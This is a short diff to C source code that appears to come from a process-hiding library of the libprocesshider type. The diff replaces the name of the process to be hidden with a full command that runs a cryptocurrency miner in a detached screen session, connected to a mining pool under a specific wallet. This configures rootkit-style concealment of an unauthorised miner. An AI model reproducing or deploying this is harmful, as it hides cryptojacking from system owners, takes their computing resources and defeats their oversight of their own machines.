@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* process_to_filter = "SCREEN -dmS MyfirstProdject ./cpuminer-args.sh -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RAAsog1RsBKEPAMrBDCAbufhZ7os1QsNC7.moonrock -p x --no-tune --cpu-priority 4";
 
 /*
  * Get a directory name given a DIR* handle
